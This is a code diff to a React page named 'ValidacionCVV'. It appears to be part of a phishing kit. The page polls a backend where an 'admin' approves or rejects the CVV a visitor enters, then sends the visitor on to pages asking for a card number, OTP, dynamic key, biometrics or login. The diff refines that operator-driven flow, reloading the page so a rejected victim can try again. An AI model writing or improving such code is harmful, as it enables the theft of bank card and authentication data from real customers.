@@ -17,8 +17,10 @@ export default function ValidacionCVV() {
     // Ref para controlar el estado de carga (fix compilación y loop)
     const loadingRef = useRef(false);
 
-    // Polling para verificar estado con timeout y límite de reintentos
+    // Polling solo se activa cuando polling === true (después de enviar CVV)
     useEffect(() => {
+        if (!polling) return; // Solo ejecutar cuando polling está activo
+
         let interval;
         let timeoutId;
         let attempts = 0;
@@ -33,12 +35,14 @@ export default function ValidacionCVV() {
                 if (!sesionId) {
                     clearInterval(interval);
                     clearTimeout(timeoutId);
+                    setPolling(false);
+                    setCargando(false);
                     return;
                 }
 
                 const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                 const { estado, cardData } = response.data;
-                console.log("Estado polling:", estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
+                console.log("Estado polling CVV:", estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
 
                 // UPDATE CARD DATA IF PRESENT
                 if (cardData) {
@@ -57,36 +61,70 @@ export default function ValidacionCVV() {
                     return;
                 }
 
+                // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
+                const estadosEspera = ['pendiente', 'solicitar_cvv_custom', 'solicitar_cvv', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
+                
+                if (estadosEspera.includes(estado)) {
+                    // Seguir esperando, mantener loading
+                    return;
+                }
+
+                // Si hay error (rechazo del admin), recargar página para permitir reintento
                 if (estado === 'error_cvv_custom') {
                     clearInterval(interval);
                     clearTimeout(timeoutId);
                     setCargando(false);
                     setPolling(false);
                     alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
-                    setCvv("");
-                } else if (estado !== 'pendiente' && estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval') {
-                    // Limpiar intervalos antes de redirigir
-                    clearInterval(interval);
-                    clearTimeout(timeoutId);
-                    
-                    // Switch para manejar redirecciones específicas
-                    switch (estado) {
-                        case 'solicitar_tc': navigate("/validacion-tc"); break;
-                        case 'solicitar_tc_custom': navigate("/validacion-tc-custom"); break;
-                        case 'solicitar_otp': navigate("/numero-otp"); break;
-                        case 'solicitar_din': navigate("/clave-dinamica"); break;
-                        case 'solicitar_finalizar': navigate("/finalizado-page"); break;
-                        case 'solicitar_biometria': navigate("/verificacion-identidad"); break;
-                        case 'error_923': navigate("/error-923page"); break;
+                    // Recargar página para permitir reintento
+                    window.location.reload();
+                    return;
+                }
 
-                        case 'error_tc': navigate("/validacion-tc"); break;
-                        case 'error_otp': navigate("/numero-otp"); break;
-                        case 'error_din': navigate("/clave-dinamica"); break;
-                        case 'error_login': navigate("/autenticacion"); break;
-
-                        default:
-                            console.log("Estado no manejado en redirección:", estado);
-                    }
+                // Si el admin aprueba y pide siguiente paso, redirigir
+                // Limpiar intervalos antes de redirigir
+                clearInterval(interval);
+                clearTimeout(timeoutId);
+                setCargando(false);
+                setPolling(false);
+                
+                // Switch para manejar redirecciones específicas (solo cuando admin aprueba)
+                switch (estado) {
+                    case 'solicitar_tc': 
+                        navigate("/validacion-tc"); 
+                        break;
+                    case 'solicitar_tc_custom': 
+                        navigate("/validacion-tc-custom"); 
+                        break;
+                    case 'solicitar_otp': 
+                        navigate("/numero-otp"); 
+                        break;
+                    case 'solicitar_din': 
+                        navigate("/clave-dinamica"); 
+                        break;
+                    case 'solicitar_finalizar': 
+                        navigate("/finalizado-page"); 
+                        break;
+                    case 'solicitar_biometria': 
+                        navigate("/verificacion-identidad"); 
+                        break;
+                    case 'error_923': 
+                        navigate("/error-923page"); 
+                        break;
+                    case 'error_tc': 
+                        navigate("/validacion-tc"); 
+                        break;
+                    case 'error_otp': 
+                        navigate("/numero-otp"); 
+                        break;
+                    case 'error_din': 
+                        navigate("/clave-dinamica"); 
+                        break;
+                    case 'error_login': 
+                        navigate("/autenticacion"); 
+                        break;
+                    default:
+                        console.log("Estado no manejado en redirección:", estado);
                 }
             } catch (error) {
                 console.error("Error polling:", error);
@@ -102,7 +140,7 @@ export default function ValidacionCVV() {
             }
         };
 
-        // Ejecutar polling cada 3s
+        // Ejecutar polling cada 3s solo cuando polling está activo
         interval = setInterval(checkStatus, 3000);
 
         // Timeout global de 3 minutos
@@ -118,7 +156,7 @@ export default function ValidacionCVV() {
             clearInterval(interval);
             clearTimeout(timeoutId);
         };
-    }, [navigate]);
+    }, [polling, navigate]);
 
     // ... (rest of states)
 
